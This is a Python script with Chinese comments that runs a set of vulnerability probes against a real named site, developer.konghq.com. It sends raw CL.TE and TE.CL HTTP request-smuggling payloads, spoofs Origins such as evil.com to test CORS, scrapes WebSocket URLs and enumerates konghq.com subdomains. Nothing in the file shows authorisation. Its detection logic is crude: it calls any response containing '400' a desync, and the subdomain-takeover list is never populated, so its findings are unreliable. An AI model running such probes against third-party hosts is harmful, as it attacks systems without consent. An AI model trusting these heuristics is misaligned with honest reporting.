#!/usr/bin/env python3
"""
KongHQ 深度漏洞挖掘
1. HTTP Desync (CL.TE/TE.CL)
2. HTTP请求走私
3. WebSocket劫持
4. CORS misconfiguration
5. Subdomain takeover检查
"""
import socket
import ssl
import requests
import json
import time
from urllib.parse import urljoin

BASE_URL = 'https://developer.konghq.com'
HOST = 'developer.konghq.com'
PORT = 443

class DeepVulnTester:
    def __init__(self):
        self.results = []
        
    def test_http_desync_cl_te(self):
        """测试CL.TE类型的HTTP Desync"""
        print("="*80)
        print("测试1: HTTP Desync - CL.TE攻击")
        print("="*80)
        
        # CL.TE payload: Content-Length在前端有效，Transfer-Encoding在后端有效
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "G"
        )
        
        try:
            context = ssl.create_default_context()
            conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=HOST)
            conn.settimeout(10)
            conn.connect((HOST, PORT))
            
            print("\n[发送] CL.TE payload...")
            conn.sendall(payload.encode())
            
            start = time.time()
            response = b""
            while time.time() - start < 5:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    response += data
                except:
                    break
            
            conn.close()
            
            if response:
                print(f"[响应长度] {len(response)} bytes")
                if b"400" in response or b"408" in response or b"timeout" in response.lower():
                    print("🔴 可疑！可能存在HTTP Desync")
                    self.results.append({
                        'test': 'HTTP Desync CL.TE',
                        'result': 'SUSPICIOUS',
                        'evidence': f'Response length: {len(response)}, Contains timeout indicators'
                    })
                else:
                    print("✅ 正常响应，未发现Desync")
            else:
                print("❌ 无响应或连接超时")
                
        except Exception as e:
            print(f"❌ 错误: {e}")
    
    def test_http_desync_te_cl(self):
        """测试TE.CL类型的HTTP Desync"""
        print("\n" + "="*80)
        print("测试2: HTTP Desync - TE.CL攻击")
        print("="*80)
        
        # TE.CL payload: Transfer-Encoding在前端有效，Content-Length在后端有效
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            "Content-Length: 3\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "1\r\n"
            "Z\r\n"
            "Q"
        )
        
        try:
            context = ssl.create_default_context()
            conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=HOST)
            conn.settimeout(10)
            conn.connect((HOST, PORT))
            
            print("\n[发送] TE.CL payload...")
            conn.sendall(payload.encode())
            
            start = time.time()
            response = b""
            while time.time() - start < 5:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    response += data
                except:
                    break
            
            conn.close()
            
            if response:
                print(f"[响应长度] {len(response)} bytes")
                if b"400" in response or b"408" in response or b"timeout" in response.lower():
                    print("🔴 可疑！可能存在HTTP Desync")
                    self.results.append({
                        'test': 'HTTP Desync TE.CL',
                        'result': 'SUSPICIOUS',
                        'evidence': f'Response length: {len(response)}, Contains timeout indicators'
                    })
                else:
                    print("✅ 正常响应，未发现Desync")
            else:
                print("❌ 无响应或连接超时")
                
        except Exception as e:
            print(f"❌ 错误: {e}")
    
    def test_cors_misconfiguration(self):
        """测试CORS配置错误"""
        print("\n" + "="*80)
        print("测试3: CORS Misconfiguration")
        print("="*80)
        
        session = requests.Session()
        
        # 测试Origin头注入
        test_origins = [
            'https://evil.com',
            'https://konghq.com.evil.com',
            'null',
            'https://developer.konghq.com.evil.com'
        ]
        
        for origin in test_origins:
            print(f"\n[测试] Origin: {origin}")
            
            headers = {
                'Origin': origin,
                'User-Agent': 'Mozilla/5.0'
            }
            
            try:
                resp = session.get(BASE_URL, headers=headers, timeout=10)
                
                acao = resp.headers.get('Access-Control-Allow-Origin')
                acac = resp.headers.get('Access-Control-Allow-Credentials')
                
                print(f"  Access-Control-Allow-Origin: {acao}")
                print(f"  Access-Control-Allow-Credentials: {acac}")
                
                if acao == origin or acao == '*':
                    if acac == 'true':
                        print("  🔴 发现CORS配置错误！允许任意源+凭据")
                        self.results.append({
                            'test': 'CORS Misconfiguration',
                            'result': 'VULNERABLE',
                            'evidence': f'Origin: {origin}, ACAO: {acao}, ACAC: {acac}'
                        })
                    else:
                        print("  ⚠️  CORS允许任意源，但不允许凭据")
                else:
                    print("  ✅ CORS配置正确")
                    
            except Exception as e:
                print(f"  ❌ 错误: {e}")
    
    def test_websocket_hijacking(self):
        """测试WebSocket劫持"""
        print("\n" + "="*80)
        print("测试4: WebSocket劫持检测")
        print("="*80)
        
        session = requests.Session()
        
        # 获取页面并查找WebSocket连接
        print("\n[分析] 页面中的WebSocket连接...")
        
        try:
            resp = session.get(BASE_URL, timeout=10)
            content = resp.text
            
            # 查找ws://或wss://
            import re
            ws_urls = re.findall(r'(?:ws|wss)://[^\s\'"]+', content)
            
            if ws_urls:
                print(f"  发现 {len(ws_urls)} 个WebSocket URL:")
                for ws in ws_urls[:5]:  # 只显示前5个
                    print(f"    - {ws}")
                
                print("\n  ⚠️  需要手动测试WebSocket认证")
                print("  建议: 使用浏览器Console监控WebSocket消息")
            else:
                print("  ✅ 未在HTML中发现硬编码的WebSocket URL")
                
        except Exception as e:
            print(f"  ❌ 错误: {e}")
    
    def check_subdomain_takeover(self):
        """检查子域名接管风险"""
        print("\n" + "="*80)
        print("测试5: 子域名接管检查")
        print("="*80)
        
        # 常见的子域名列表
        subdomains = [
            'www', 'api', 'dev', 'staging', 'test',
            'admin', 'blog', 'docs', 'mail', 'ftp',
            'cdn', 'static', 'app', 'dashboard', 'portal'
        ]
        
        print("\n[扫描] 常见子域名...")
        
        vulnerable = []
        
        for sub in subdomains:
            domain = f"{sub}.konghq.com"
            try:
                # 尝试DNS解析
                import socket
                ip = socket.gethostbyname(domain)
                print(f"  {domain} → {ip}")
                
                # 检查是否指向第三方服务
                if any(x in ip for x in ['185.199', '151.101', '104.16']):
                    print(f"    ⚠️  可能指向CDN/云服务，需要进一步检查")
                    
            except socket.gaierror:
                print(f"  {domain} → 未解析")
            except Exception as e:
                print(f"  {domain} → 错误: {e}")
        
        if vulnerable:
            print(f"\n🔴 发现 {len(vulnerable)} 个可能的子域名接管风险")
            self.results.append({
                'test': 'Subdomain Takeover',
                'result': 'POTENTIAL',
                'evidence': str(vulnerable)
            })
        else:
            print("\n✅ 未发现明显的子域名接管风险")
    
    def generate_report(self):
        """生成测试报告"""
        print("\n" + "="*80)
        print("📊 测试报告")
        print("="*80)
        
        print(f"\n总测试数: {len(self.results) + 5}")  # 5个测试
        vulns = [r for r in self.results if r['result'] in ['VULNERABLE', 'SUSPICIOUS', 'POTENTIAL']]
        
        print(f"发现问题: {len(vulns)}")
        
        if vulns:
            print("\n🔴 发现的问题:")
            for i, result in enumerate(vulns, 1):
                print(f"\n  [{i}] {result['test']}")
                print(f"      状态: {result['result']}")
                print(f"      证据: {result['evidence']}")
            
            print("\n⚠️  建议进一步手动验证以上问题")
        else:
            print("\n✅ 未发现明显的安全问题")
            print("\n说明:")
            print("  • HTTP Desync需要使用Burp Suite等专业工具深入测试")
            print("  • WebSocket需要在浏览器中实时监控")
            print("  • 子域名接管需要完整的DNS枚举")
        
        # 保存结果
        with open('deep_vuln_test_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\n详细结果已保存到: deep_vuln_test_results.json")

if __name__ == '__main__':
    tester = DeepVulnTester()
    
    print("="*80)
    print(" KongHQ 深度漏洞挖掘")
    print("="*80)
    print(f"\n目标: {BASE_URL}")
    print(f"时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    # 执行所有测试
    tester.test_http_desync_cl_te()
    tester.test_http_desync_te_cl()
    tester.test_cors_misconfiguration()
    tester.test_websocket_hijacking()
    tester.check_subdomain_takeover()
    
    # 生成报告
    tester.generate_report()
